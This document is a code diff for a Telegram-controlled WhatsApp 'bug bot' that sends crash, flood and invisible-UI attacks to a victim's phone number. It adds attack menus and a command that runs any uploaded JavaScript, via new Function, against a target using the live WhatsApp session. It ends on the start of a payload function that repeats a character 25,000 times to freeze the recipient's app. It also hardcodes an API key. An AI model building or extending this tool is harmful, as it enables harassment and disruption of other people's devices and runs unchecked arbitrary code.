@@ -30,7 +30,7 @@ const {
     WAContextInfo,
     WAGroupMetadata,
     ProxyAgent,
-    waChatKey,
+    waChatKey, 
     MimetypeMap,
     MediaPathMap,
     WAContactMessage,
@@ -85,7 +85,7 @@ const { BOT_TOKEN, OWNER_ID } = require("./config.js");
 const TelegramBot = require("node-telegram-bot-api");
 
 // === OTP Persistent Storage ===
-const VERIFIED_FILE = path.join(__dirname, "STELLAR", "verified.json");
+const VERIFIED_FILE = path.join(__dirname, "kairn", "verified.json");
 let verifiedUsers = new Set();
 
 function loadVerifiedUsers() {
@@ -158,7 +158,7 @@ async function pullUpdate(bot, msg) {
         const remoteHash = crypto.createHash('sha256').update(remoteFile).digest('hex');
 
         if (localHash === remoteHash) {
-            return bot.sendMessage(chatId, 'INDEX SUDAH VERSI TERBARU✅');
+            return bot.sendMessage(chatId, 'ANDA SUDAH DI VERSI YANG TERBARU!');
         }
 
         fs.writeFileSync('./index.backup.js', localFile);
@@ -296,168 +296,222 @@ async function main() {
 main();
 
 // --------------- ( Save Session & Installasion WhatsApp ) ------------------- \\
-let sock
-const pairingRequested = new Set()
-
-function createSessionDir(botNumber) {
-    const dir = path.join(SESSIONS_DIR, `device${botNumber}`)
-    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true })
-    return dir
-}
+let sock;
 
 function saveActiveSessions(botNumber) {
-    try {
-        let list = []
-        if (fs.existsSync(SESSIONS_FILE)) {
-            list = JSON.parse(fs.readFileSync(SESSIONS_FILE))
-        }
-        if (!list.includes(botNumber)) {
-            list.push(botNumber)
-            fs.writeFileSync(SESSIONS_FILE, JSON.stringify(list))
-        }
-    } catch (e) {
-        console.error("save session error:", e)
+  try {
+    const sessionsList = [];
+    if (fs.existsSync(SESSIONS_FILE)) {
+      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
+      if (!existing.includes(botNumber)) {
+        sessionsList.push(...existing, botNumber);
+      }
+    } else {
+      sessionsList.push(botNumber);
     }
+    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsList));
+  } catch (error) {
+    console.error("Error saving session:", error);
+  }
 }
 
 async function initializeWhatsAppConnections() {
-    if (!fs.existsSync(SESSIONS_FILE)) return
+  try {
+    if (fs.existsSync(SESSIONS_FILE)) {
+      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
+      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);
 
-    const numbers = JSON.parse(fs.readFileSync(SESSIONS_FILE))
-    console.log("restore session:", numbers.length)
-
-    for (const botNumber of numbers) {
-        const sessionDir = createSessionDir(botNumber)
-        const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
+      for (const botNumber of activeNumbers) {
+        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
+        const sessionDir = createSessionDir(botNumber);
+        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
 
         const sockInstance = makeWASocket({
-            auth: state,
-            printQRInTerminal: false,
-            logger: P({ level: "silent" }),
-            defaultQueryTimeoutMs: 30000
-        })
+          auth: state,
+          printQRInTerminal: true,
+          logger: P({ level: "silent" }),
+          defaultQueryTimeoutMs: undefined,
+        });
 
-        sockInstance.ev.on("connection.update", (update) => {
-            if (update.connection === "open") {
-                sessions.set(botNumber, sockInstance)
-                sock = sockInstance
-                console.log("connected:", botNumber)
+        await new Promise((resolve, reject) => {
+          sockInstance.ev.on("connection.update", async (update) => {
+            const { connection, lastDisconnect } = update;
+            if (connection === "open") {
+              console.log(`Bot ${botNumber} terhubung!`);
+              sessions.set(botNumber, sockInstance);
+              sock = sockInstance;
+              resolve();
+            } else if (connection === "close") {
+              const shouldReconnect =
+                lastDisconnect?.error?.output?.statusCode !==
+                DisconnectReason.loggedOut;
+              if (shouldReconnect) {
+                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
+                await initializeWhatsAppConnections();
+              } else {
+                reject(new Error("Koneksi ditutup"));
+              }
             }
+          });
 
-            if (update.connection === "close") {
-                const code = update.lastDisconnect?.error?.output?.statusCode
-                if (code !== DisconnectReason.loggedOut) {
-                    console.log("reconnect:", botNumber)
-                    initializeWhatsAppConnections()
-                } else {
-                    fs.rmSync(sessionDir, { recursive: true, force: true })
-                }
-            }
-        })
-
-        sockInstance.ev.on("creds.update", saveCreds)
+          sockInstance.ev.on("creds.update", saveCreds);
+        });
+      }
     }
+  } catch (error) {
+    console.error("Error initializing WhatsApp connections:", error);
+  }
 }
+
+function createSessionDir(botNumber) {
+  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
+  if (!fs.existsSync(deviceDir)) {
+    fs.mkdirSync(deviceDir, { recursive: true });
+  }
+  return deviceDir;
+}
+
+//// --- ( Instalasi WhatsApp ) --- \\\
 async function connectToWhatsApp(botNumber, chatId) {
-    const statusMsg = await bot.sendMessage(
-        chatId,
-        `<blockquote>
-┌─────────────────────────┐
-│ MENYIAPKAN PAIRING
+  let statusMessage = await bot
+    .sendMessage(
+      chatId,
+      `
+<blockquote>┌─────────────────────────┐
+│  MENYIAPKAN CODE PAIRING
 ├─────────────────────────┤
 │ Nomor : ${botNumber}
-└─────────────────────────┘
-</blockquote>`,
-        { parse_mode: "HTML" }
+└─────────────────────────┘</blockquote>
+`,
+      { parse_mode: "HTML" }
     )
+    .then((msg) => msg.message_id);
 
-    const sessionDir = createSessionDir(botNumber)
-    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
+  const sessionDir = createSessionDir(botNumber);
+  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
 
-    const sockInstance = makeWASocket({
-        auth: state,
-        printQRInTerminal: false,
-        logger: P({ level: "silent" }),
-        defaultQueryTimeoutMs: 30000
-    })
+  const sockInstance = makeWASocket({
+    auth: state,
+    printQRInTerminal: false,
+    logger: P({ level: "silent" }),
+    defaultQueryTimeoutMs: undefined,
+  });
 
-    sockInstance.ev.on("connection.update", async (update) => {
-        const { connection, lastDisconnect } = update
+  sockInstance.ev.on("connection.update", async (update) => {
+    const { connection, lastDisconnect } = update;
 
-        if (connection === "connecting") {
-    if (!fs.existsSync(`${sessionDir}/creds.json`) && !pairingRequested.has(botNumber)) {
-        pairingRequested.add(botNumber)
-
-        setTimeout(async () => {
-            try {
-                const code = await sockInstance.requestPairingCode(botNumber)
-                const format = code.match(/.{1,4}/g).join("-")
-
-                await bot.editMessageText(
-                    `<blockquote>
-┌─────────────────────────┐
-│ CODE PAIRING
+    if (connection === "close") {
+      const statusCode = lastDisconnect?.error?.output?.statusCode;
+      if (statusCode && statusCode >= 500 && statusCode < 600) {
+        await bot.editMessageText(
+          `
+<blockquote>┌─────────────────────────┐
+│ Memproses Connection
 ├─────────────────────────┤
 │ Nomor : ${botNumber}
-│ Kode  : ${format}
-└─────────────────────────┘
-</blockquote>`,
-                    {
-                        chat_id: chatId,
-                        message_id: statusMsg.message_id,
-                        parse_mode: "HTML"
-                    }
-                )
-            } catch (e) {
-                pairingRequested.delete(botNumber)
-                console.log("pairing rejected")
-            }
-        }, 1500)
+│ Status : Proses 🔄.
+└─────────────────────────┘</blockquote>
+`,
+          {
+            chat_id: chatId,
+            message_id: statusMessage,
+            parse_mode: "HTML",
+          }
+        );
+        await connectToWhatsApp(botNumber, chatId);
+      } else {
+        await bot.editMessageText(
+          `
+<blockquote>┌─────────────────────────┐
+│ Connection Gagal
+├─────────────────────────┤
+│ Nomor : ${botNumber}
+│ Status :  Gagal ❌
+└─────────────────────────┘</blockquote>
+`,
+          {
+            chat_id: chatId,
+            message_id: statusMessage,
+            parse_mode: "HTML",
+          }
+        );
+        try {
+          fs.rmSync(sessionDir, { recursive: true, force: true });
+        } catch (error) {
+          console.error("Error deleting session:", error);
+        }
+      }
+    } else if (connection === "open") {
+      sessions.set(botNumber, sockInstance);
+      sock = sockInstance;
+      saveActiveSessions(botNumber);
+      await bot.editMessageText(
+        `
+<blockquote>┌─────────────────────────┐
+│ Connection Sukses
+├─────────────────────────┤
+│ Nomor : ${botNumber}
+│ Status : Sukses Connect.✅
+└─────────────────────────┘</blockquote>
+`,
+        {
+          chat_id: chatId,
+          message_id: statusMessage,
+          parse_mode: "HTML",
+        }
+      );
+    } else if (connection === "connecting") {
+      await new Promise((resolve) => setTimeout(resolve, 1000));
+      try {
+        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
+          const code = await sockInstance.requestPairingCode(botNumber);
+          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
+
+          await bot.editMessageText(
+            `
+<blockquote>┌─────────────────────────┐
+│ YOUR CODE PAIRING
+├─────────────────────────┤
+│ Nomor : ${botNumber}
+│ Kode  : <code>${formattedCode}</code>
+└─────────────────────────┘</blockquote>
+`,
+            {
+              chat_id: chatId,
+              message_id: statusMessage,
+              parse_mode: "HTML",
+            });
+        }
+      } catch (error) {
+        console.error("Error requesting pairing code:", error);
+        await bot.editMessageText(
+          `
+<blockquote>┌─────────────────────────┐
+│ STATUS │ Sedang Pairing
+├─────────────────────────┤
+│ Nomor : ${botNumber}
+│ Kode  : ${error.message} Error⚠️
+└─────────────────────────┘</blockquote>
+`,
+          {
+            chat_id: chatId,
+            message_id: statusMessage,
+            parse_mode: "HTML",
+          }
+        );
+      }
     }
+  });
+
+  sockInstance.ev.on("creds.update", saveCreds);
+
+  return sockInstance;
 }
-
-        if (connection === "open") {
-            sessions.set(botNumber, sockInstance)
-            sock = sockInstance
-            saveActiveSessions(botNumber)
-            pairingRequested.delete(botNumber)
-
-            await bot.editMessageText(
-                `<blockquote>
-┌─────────────────────────┐
-│ CONNECTED
-├─────────────────────────┤
-│ Nomor : ${botNumber}
-│ Status: SUCCESS
-└─────────────────────────┘
-</blockquote>`,
-                {
-                    chat_id: chatId,
-                    message_id: statusMsg.message_id,
-                    parse_mode: "HTML"
-                }
-            )
-        }
-
-        if (connection === "close") {
-            const code = lastDisconnect?.error?.output?.statusCode
-            if (code === DisconnectReason.loggedOut) {
-                fs.rmSync(sessionDir, { recursive: true, force: true })
-                pairingRequested.delete(botNumber)
-            }
-        }
-    })
-
-    sockInstance.ev.on("creds.update", saveCreds)
-    return sockInstance
-}
-
-
 
 // ---------- ( Read File And Save Premium - ceo - Owner ) ----------- \\
-const STELLAR_DIR = path.join(__dirname, "STELLAR");
-if (!fs.existsSync(STELLAR_DIR)) {
-    fs.mkdirSync(STELLAR_DIR, { recursive: true });
+const kairn_DIR = path.join(__dirname, "kairn");
+if (!fs.existsSync(kairn_DIR)) {
+    fs.mkdirSync(kairn_DIR, { recursive: true });
 }
 
 let premiumUsers = [];
@@ -469,12 +523,12 @@ function ensureFileExists(filePath, defaultData = []) {
     }
 }
 
-ensureFileExists('./STELLAR/premium.json', []);
-ensureFileExists('./STELLAR/ceo.json', []);
+ensureFileExists('./kairn/premium.json', []);
+ensureFileExists('./kairn/ceo.json', []);
 
 function loadPremiumUsers() {
     try {
-        premiumUsers = JSON.parse(fs.readFileSync('./STELLAR/premium.json'));
+        premiumUsers = JSON.parse(fs.readFileSync('./kairn/premium.json'));
     } catch (error) {
         premiumUsers = [];
         console.error("Error loading premium users:", error);
@@ -483,7 +537,7 @@ function loadPremiumUsers() {
 
 function loadCeoUsers() {
     try {
-        ceoUsers = JSON.parse(fs.readFileSync('./STELLAR/ceo.json'));
+        ceoUsers = JSON.parse(fs.readFileSync('./kairn/ceo.json'));
     } catch (error) {
         ceoUsers = [];
         console.error("Error loading ceo users:", error);
@@ -491,11 +545,11 @@ function loadCeoUsers() {
 }
 
 function savePremiumUsers() {
-    fs.writeFileSync('./STELLAR/premium.json', JSON.stringify(premiumUsers, null, 2));
+    fs.writeFileSync('./kairn/premium.json', JSON.stringify(premiumUsers, null, 2));
 }
 
 function saveceoUsers() {
-    fs.writeFileSync('./STELLAR/ceo.json', JSON.stringify(ceoUsers, null, 2));
+    fs.writeFileSync('./kairn/ceo.json', JSON.stringify(ceoUsers, null, 2));
 }
 
 // Load data saat startup
@@ -652,19 +706,19 @@ bot.on("callback_query", async (callbackQuery) => {
 <pre>ＫＡＩＲＮ - ＢＡＳＥ</pre>
 <blockquote>Kairn Base — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. Kairn Base также имеет новейшие и качественные функции. </blockquote>
 ─────────────────────────
-<blockquote># ☇ 𝘌𝘹𝘱𝘭𝘰𝘪𝘵 𝘔𝘦𝘯𝘶</blockquote>
+<blockquote># ☇ 𝘌𝘟𝘗𝘓𝘖𝘐𝘛 - 𝘔𝘌𝘕𝘜</blockquote>
 /nezha - Polling System 
             `;
             newButtons = [
-                [{ text: "(🔙) 戻る", callback_data: "mainmenu" }], 
-                [{ text: "𝟧𝟣𝟥", url: "https://t.me/StellarNecrosis" }],
+                [{ text: "тление", callback_data: "mainmenu", style: "danger"}], 
+                [{ text: "НАЗАД", callback_data: "mainmenu" }], 
             ];
         } else if (data === "ownermenu") {
             newCaption = `
 <pre>ＫＡＩＲＮ - ＢＡＳＥ</pre>
 <blockquote>Kairn Base — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. Kairn Base также имеет новейшие и качественные функции. </blockquote>
 ─────────────────────────
-<blockquote># ☇ 𝘈𝘥𝘮𝘪𝘯 𝘔𝘦𝘯𝘶</blockquote>
+<blockquote># ☇ 𝘊𝘖𝘕𝘛𝘙𝘖𝘓 - 𝘔𝘌𝘕𝘜</blockquote>
  ◌️ /reloadcore - Update Bot
  ◌ /addprem - Add premium user
  ◌ /delprem - delete premium users
@@ -675,18 +729,44 @@ bot.on("callback_query", async (callbackQuery) => {
  ◌ /resetsession - Hapus semua sesi WhatsApp
             `;
             newButtons = [
-                [{ text: "(🔙) 戻る", callback_data: "mainmenu" }], 
+                                [{ text: "НАЗАД", callback_data: "mainmenu" }], 
+            ];
+            } else if (data === "bug2") {
+            newCaption = `
+<pre>ＫＡＩＲＮ - ＢＡＳＥ</pre>
+<blockquote>Kairn Base — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. Kairn Base также имеет новейшие и качественные функции. </blockquote>
+─────────────────────────
+<blockquote># ☇ Exploit - Version2 </blockquote>
+/latera    - Blank Ui Invisible
+/thores   - Delay Flood
+            `;
+            newButtons = [
+                                [{ text: "НАЗАД", callback_data: "mainmenu" }], 
             ];
         } else if (data === "thanksto") {
             newCaption = `
 <pre>ＫＡＩＲＮ - ＢＡＳＥ</pre>
 <blockquote>Kairn Base — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. Kairn Base также имеет новейшие и качественные функции. </blockquote>
 ─────────────────────────
-<blockquote># ☇ 𝘚𝘶𝘱𝘱𝘰𝘳𝘵 𝘔𝘦𝘯𝘶</blockquote>
+<blockquote># ☇ 𝘛𝘏𝘈𝘕𝘒𝘚 - 𝘛𝘖</blockquote>
 - 𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇 - Author
             `;
             newButtons = [
-                [{ text: "(🔙) 戻る", callback_data: "mainmenu" }], 
+                        [{ text: "НАЗАД", callback_data: "mainmenu" }], 
+            ];
+            } else if (data === "tools") {
+            newCaption = `
+<pre>ＫＡＩＲＮ - ＢＡＳＥ</pre>
+<blockquote>Kairn Base — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. Kairn Base также имеет новейшие и качественные функции. </blockquote>
+─────────────────────────
+<blockquote># ☇ 𝘛𝘖𝘖𝘓𝘚 - 𝘔𝘌𝘕𝘜</blockquote>
+- /ai            - asisten ai 
+- /jadwalsholat  - Jadwal Sholat Tiap kota
+- /brat          - buat gambar (brat) 
+
+            `;
+            newButtons = [
+                             [{ text: "НАЗАД", callback_data: "mainmenu" }],  
             ];
         } else if (data === "mainmenu") {
             newCaption = `
@@ -708,6 +788,9 @@ bot.on("callback_query", async (callbackQuery) => {
                 [
                     { text: "саппорт", callback_data: "thanksto" }, 
                     { text: "руль", callback_data: "ownermenu" }
+                ], 
+                [
+                { text: "ИНСТРУМЕНТЫ", callback_data: "tools", style: "danger" }
                 ], 
             ];
         } else {
@@ -737,7 +820,7 @@ const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 const activePolls = new Map();
 
 
-////( CASE POLLING) \\\\
+///////////////( CASE POLLING) \\\\\\\\\
 bot.onText(/\/nezha(?:\s+(\d+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
@@ -805,7 +888,7 @@ bot.onText(/\/nezha(?:\s+(\d+))?/, async (msg, match) => {
 
     // BUAT POLL BENERAN (bukan inline button)
     const pollMessage = await bot.sendPoll(chatId, 
-        `PILIH TYPE BUG`, // Question
+        `ПОЖАЛУЙСТА, ВЫБЕРИТЕ`, // Question
         ['DELAY 𝖠𝖳𝖳𝖠𝖢𝖪', 'F𝖢 𝖨𝖭𝖵𝖨𝖲𝖨𝖡𝖫𝖤', 'CRASH 𝖠𝖭𝖣𝖱𝖮𝖨𝖣', '❌ BATAL'], // Options
         {
             is_anonymous: false, 
@@ -934,7 +1017,7 @@ bot.on('poll_answer', async (pollAnswer) => {
 ├─────────────────────────┤
 │─ Target : ${pollData.targetNumber}
 │─ 𝖳𝗒𝗉𝖾 : ${action.toUpperCase()} Attack
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⚡ 𝖯𝗋𝗈𝗌𝖾𝗌
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌 Send Bug
 │─ Date   : ${pollData.date}
 └─────────────────────────┘</blockquote>
  ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
@@ -984,7 +1067,7 @@ bot.on('poll_answer', async (pollAnswer) => {
 │   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
 ├─────────────────────────┤
 │─ Target : ${pollData.targetNumber}
-│─ 𝖳𝗒𝗉𝖾 : ${action.toUpperCase()} Attack
+│─ 𝖳𝗒𝗉𝖾 : ${action.toUpperCase()} 
 │─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝖿𝗎𝗅𝗅𝗒
 │─ Date   : ${pollData.date}
 └─────────────────────────┘</blockquote>
@@ -1010,7 +1093,7 @@ bot.on('poll_answer', async (pollAnswer) => {
 │   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
 ├─────────────────────────┤
 │─ Target : ${pollData.targetNumber}
-│─ 𝖳𝗒𝗉𝖾 : ${action.toUpperCase()} Attack
+│─ 𝖳𝗒𝗉𝖾 : ${action.toUpperCase()} 
 │─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖦𝖺𝗀𝖺𝗅
 │─ Error  : ${err.message}
 │─ Date   : ${pollData.date}
@@ -1028,10 +1111,90 @@ bot.on('poll_answer', async (pollAnswer) => {
     // Hapus data poll
     activePolls.delete(pollId);
 });
+////// CASE TESTFUNC AND UPLOADFUNC
+// Map untuk menyimpan fungsi yang diupload per user (key: userId)
+// Setiap entry berisi { code: string, used: boolean }
+const userFunctions = new Map();
+
+// Command: /uploadfunc (harus reply ke file .js)
+bot.onText(/\/uploadfunc/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+
+    // Validasi: harus reply ke dokumen
+    if (!msg.reply_to_message || !msg.reply_to_message.document) {
+        return bot.sendMessage(chatId, '❌ Reply file .js dengan perintah /uploadfunc');
+    }
+
+    const doc = msg.reply_to_message.document;
+    if (!doc.file_name.endsWith('.js')) {
+        return bot.sendMessage(chatId, '❌ Hanya file .js yang diperbolehkan');q
+    }
+
+    try {
+        // Dapatkan link file dan baca isinya
+        const fileLink = await bot.getFileLink(doc.file_id);
+        const response = await axios.get(fileLink);
+        const code = response.data;
+
+        // Simpan kode dengan status belum digunakan
+        userFunctions.set(userId, { code, used: false });
+
+        bot.sendMessage(chatId, '✅ Fungsi berhasil diupload! Sekarang kamu bisa menggunakan /testfunction .');
+    } catch (err) {
+        bot.sendMessage(chatId, `❌ Gagal membaca file: ${err.message}`);
+    }
+});
+
+// Command: /testfunction [nomor]
+bot.onText(/\/testfunction(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+
+    // Validasi nomor target
+    if (!match || !match[1]) {
+        return bot.sendMessage(chatId, '❌ Gunakan: /testfunction [nomor]\nContoh: /testfunction 6281234567890');
+    }
+
+    const targetNumber = match[1];
+    const formattedNumber = targetNumber.replace(/[^0-9]/g, '');
+    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
+        return bot.sendMessage(chatId, '❌ Nomor tidak valid. Pastikan 10-15 digit (termasuk kode negara).');
+    }
+
+    // Cek apakah user memiliki fungsi yang diupload dan belum dipakai
+    const userFunc = userFunctions.get(userId);
+    if (!userFunc || userFunc.used) {
+        return bot.sendMessage(chatId, '❌ Kamu belum mengupload fungsi atau sudah digunakan. Upload ulang dengan /uploadfunc');
+    }
+
+    // Cek koneksi WhatsApp (asumsi sessions adalah Map/Set yang menyimpan session aktif)
+    if (sessions.size === 0) {
+        return bot.sendMessage(chatId, '⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.');
+    }
+
+    const target = `${formattedNumber}@s.whatsapp.net`;
+
+    try {
+        // Buat fungsi dari kode yang diupload.
+        // Fungsi akan menerima parameter sock, target, dan console (agar bisa logging).
+        // Gunakan new Function agar kode dieksekusi dalam lingkup terbatas.
+        const fn = new Function('sock', 'target', 'console', userFunc.code);
+
+        // Jalankan fungsi (bisa async, maka gunakan await)
+        const result = await fn(sock, target, console);
+
+        // Hapus data fungsi setelah digunakan (one-time use)
+        userFunctions.delete(userId);
+
+        bot.sendMessage(chatId, `✅ Fungsi dijalankan. Hasil: ${result !== undefined ? result : 'Sukses'}`);
+    } catch (err) {
+        bot.sendMessage(chatId, `❌ Gagal menjalankan fungsi: ${err.message}`);
+    }
+});
 
 
-
-/// --- ( Case Bug ) --- \\\
+/// --- ( Case Bug Biasa ) --- \\\
 bot.onText(/\/zincy(?:\s+(\d+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
@@ -1161,12 +1324,10 @@ bot.onText(/\/zincy(?:\s+(\d+))?/, async (msg, match) => {
 
 
 
-////Pul Update
+///////// ( CONTROL ) \\\\\\\\\\\\\\\
 bot.onText(/^\/reloadcore$/, async (msg) => {
     pullUpdate(bot, msg);
 });
-
-//  -------------- ( connect) ----------- \\
 bot.onText(/^\/connect\s+(\d+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
@@ -1204,8 +1365,6 @@ Mohon tunggu sebentar.
 `, { parse_mode: "Markdown" });
     }
 });
-
-// ================= RESET SESSION =================
 bot.onText(/^\/resetsession$/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
@@ -1324,6 +1483,7 @@ Waktu diperpanjang sampai:
     console.log(`[PREMIUM] ${senderId} menambahkan ${userId} sampai ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
 });
 
+
 /// --- ( case list acces premium ) --- \\\
 bot.onText(/\/listprem/, (msg) => {
     const chatId = msg.chat.id;
@@ -1350,6 +1510,11 @@ bot.onText(/\/listprem/, (msg) => {
 
     bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
 });
+///// Case Ai
+// index.js
+
+
+
 
 // --- ( case add ceo ) ---
 bot.onText(/\/addceo(?:\s(.+))?/, (msg, match) => {
@@ -1498,7 +1663,32 @@ bot.onText(/\/aboutme/, async (msg) => {
     }
 });
 
-// ------------------ ( Function Attack ) ------------------------ \\
+////////( PLUGIN TOOLS ) ///////
+// ======================
+// /ai – tanya AI
+// ======================
+bot.onText(/^\/ai(?:\s+(.+))?/, async (msg, match) => {
+    const chatId = msg.chat.id
+    const teks = match[1]
+    if (!teks) return bot.sendMessage(chatId, "isi teks dulu dong, contoh: /ai halo")
+
+    bot.sendChatAction(chatId, "typing")
+
+    try {
+        const url = "https://api.deline.web.id/ai/copilot?apikey=agasndul&text=" + encodeURIComponent(teks)
+        const res = await fetch(url)
+        const data = await res.json()
+
+        if (!data.status) return bot.sendMessage(chatId, "AI error:\n" + (data.message || "unknown"))
+
+        // bersihin simbol aneh
+        const jawaban = data.result.replace(/[#_*`~]/g, "").replace(/\n{3,}/g, "\n\n").trim()
+        bot.sendMessage(chatId, jawaban)
+    } catch (e) {
+        bot.sendMessage(chatId, "AI lagi lambat, coba lagi nanti")
+    }
+})
+
 async function DavDoctUi(target) {
     let DavaXploitt = ":⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⸸⃟⃟『𝐃𝐚𝐯𝐚 𝐗𝐩𝐥𝐨𝐢𝐭𝐭』ꪾ〽️";
     let boomui = "ြ".repeat(25000);
